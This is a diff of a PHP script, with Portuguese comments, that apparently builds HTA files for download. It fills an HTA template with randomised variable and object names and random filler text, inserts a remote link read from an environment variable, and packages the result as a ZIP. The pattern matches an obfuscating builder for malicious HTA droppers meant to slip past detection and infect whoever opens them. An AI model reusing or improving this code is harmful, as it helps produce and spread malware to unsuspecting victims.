@@ -20,10 +20,11 @@ $path = dirname(__DIR__, 2);
 //echo $path;
 
 require_once($path . '/src/utils/funcoes.php');
-require_once($path . '/config.php');
+// require_once($path . '/config.php');
 
+//var_dump(getenv('LINK_HTA'));die;
 //CARREGA ARQUIVO TXT EM UM ARRAY
-$listawords = file($path . '/src/model/words.txt');
+$listawords = file($path . '/src/model/words.txt');//MONTAR O TEXTO ALEATÓRIO
 $textrand = "";
 //GERA UM NUMERO DANDOMICO ENTRE 300 E 3000
 $qtwords = rand(300, 3000);
@@ -35,13 +36,15 @@ for ($i = 0; $i < $qtwords; $i++) {
 $textrand = str_replace("\r\n", " ", $textrand);
 
 //ABRE DEFALT HTA
-$sHTA = (file_get_contents($path . '/src/model/default_model_hta.txt'));
+$sHTA = (file_get_contents($path . '/src/model/default_model_hta_DIMAS.txt'));
 //novos passos  
 $sHTA = str_replace("%hta_var_01%", GeraStringRandomica(rand(3, 8)) . (string)(rand(5000, 2000)) . GeraStringRandomica(rand(2, 5)), $sHTA);
 $sHTA = str_replace("%hta_var_02%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
 $sHTA = str_replace("%hta_boj_01%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
-$sHTA = str_replace("%htal_link%", $link_hta, $sHTA);
-$sHTA = str_replace("%textrand%", $textrand, $sHTA);
+$sHTA = str_replace("%htal_link%",getenv('LINK_HTA'), $sHTA);
+//$sHTA = str_replace("%textrand%", $textrand, $sHTA);
+
+ //echo "<!-- " . $sHTA . " -->"; die ;
 
 // header('Content-Type: text/plain;');
 
@@ -58,7 +61,8 @@ $prefixoNomeHTA  = $sNomeLOad;
 $zipPath = $filexDir . '/' . $NomeZIP;
 
 // ZIP só com o .hta em string (sem ficheiro "fonte" obrigatório)
-if (!GeraArquivoZipParaDownload('', $sHTA, $zipPath, $sNomeLOad)) {
+$zipPath = GeraArquivoZipParaDownload('', $sHTA, $filexDir . '/' . $NomeZIP, $sNomeLOad);
+if ($zipPath === false) {
     throw new RuntimeException('Não foi possível gerar o arquivo ZIP.');
 }
 
